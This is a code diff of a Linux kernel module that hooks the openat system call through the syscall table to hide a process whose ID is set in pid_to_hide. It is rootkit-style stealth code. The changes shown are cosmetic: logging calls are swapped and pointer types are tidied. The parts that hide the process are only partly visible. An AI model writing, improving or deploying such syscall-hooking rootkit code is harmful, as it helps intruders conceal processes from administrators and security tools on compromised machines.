@@ -22,10 +22,10 @@ typedef int (*original_openat_t)(const struct pt_regs *regs);
 static original_openat_t original_openat_ptr;
 
 int new_openat(const struct pt_regs *regs) {
-    void *path_name_ptr = (void*)regs->si;
+    char *path_name_ptr = (char*)regs->si;
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
-    copy_from_user((void*)path, path_name_ptr, PATH_MAX);
+    copy_from_user(path, path_name_ptr, PATH_MAX);
 
     // Incase pid to hide has been changed.
     initialize_path_to_hide();
@@ -46,9 +46,9 @@ void initialize_path_to_hide(void) {
 }
 
 int load(void) {
-    printk(KERN_ALERT "Initializing...");
+    pr_info("Initializing...");
     if (pid_to_hide == NULL) {
-        printk(KERN_ALERT "Pid to hide has not been set! Exiting...");
+        pr_warn("Pid to hide has not been set! Exiting...");
         return -1;
     }
 
@@ -61,16 +61,16 @@ int load(void) {
     }
 
     original_openat_ptr = (original_openat_t)openat_ptr;
-    printk(KERN_ALERT "Initialized successfuly!");
+    pr_info("Initialized successfuly!");
 
     return 0;
 }
  
 void unload(void) {
-    printk(KERN_ALERT "Shutting down.");
+    pr_info("Shutting down.");
     restore_syscall(__NR_openat, (unsigned long)original_openat_ptr);
     kfree(path_to_hide);
-    printk(KERN_ALERT "Goodbye world...");
+    pr_info("Goodbye world...");
 }
 
 module_init(load);
